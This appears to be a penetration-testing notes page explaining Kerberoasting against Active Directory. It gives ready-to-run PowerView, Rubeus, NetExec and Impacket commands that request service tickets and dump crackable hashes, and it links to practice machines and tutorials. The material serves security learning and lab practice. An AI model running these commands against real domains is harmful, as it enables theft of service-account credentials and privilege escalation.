---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Kerberoasting

## TL;DR

Kerberoasting is an attack on the ST and [SPNs](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names). SPNs are unique IDs that Kerberos uses to map a service instance, for example MySQL, to a service sign-in account, such as `svc_mysql`, in whose, often privileged, context the service is running. The ST is encrypted with the service's account NTLM hash, so it can potentially be cracked. **Any domain user can request a ST from the DC for any SPN account**.

<figure><img src="../../../../.gitbook/assets/kerberoasting_process.png" alt=""><figcaption><p>Figure 1: The Kerberos authentication process (image taken from <a href="https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel">here</a>).</p></figcaption></figure>

## Windows

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
{% endtab %}

{% tab title="Rubeus" %}
{% code overflow="wrap" %}
```powershell
.\Rubeus.exe kerberoast /creduser:domain\user1 /credpassword:pass /user:targetUser /outfile:hash.txt /format:hashcat /nowrap
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Linux

{% tabs %}
{% tab title="NetExec" %}
```bash
nxc ldap 192.168.0.104 -u user -p pass --kerberoasting output.txt
```
{% endtab %}

{% tab title="Impacket" %}
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN/user -request -outputfile spns.lst
```
{% endtab %}
{% endtabs %}

## Practice

{% tabs %}
{% tab title="Active (Easy)" %}
{% content-ref url="../../../../boxes/boxes/easy/active.md" %}
[active.md](../../../../boxes/boxes/easy/active.md)
{% endcontent-ref %}
{% endtab %}

{% tab title="Sizzle (Insane)" %}
{% content-ref url="../../../../boxes/boxes/insane/sizzle.md" %}
[sizzle.md](../../../../boxes/boxes/insane/sizzle.md)
{% endcontent-ref %}
{% endtab %}
{% endtabs %}

## Resources

{% tabs %}
{% tab title="Video Tutorial" %}
{% embed url="https://www.youtube.com/watch?v=-3MxoxdzFNI" %}
Kerberoasting in 14 minutes!
{% endembed %}
{% endtab %}

{% tab title="GetUserSPNs" %}
{% embed url="https://www.youtube.com/watch?v=xH5T9-m9QXw" %}
How GetUserSPNs script work behind the scenes!
{% endembed %}
{% endtab %}

{% tab title="Tim Medin's Lecture" %}
{% embed url="https://www.youtube.com/watch?v=Jaa2LmZaNeU" %}
{% endtab %}

{% tab title="Kerberoasting" %}
{% embed url="https://adsecurity.org/?p=3458" %}
A great article detailing the Kerberoasting process.
{% endembed %}
{% endtab %}
{% endtabs %}
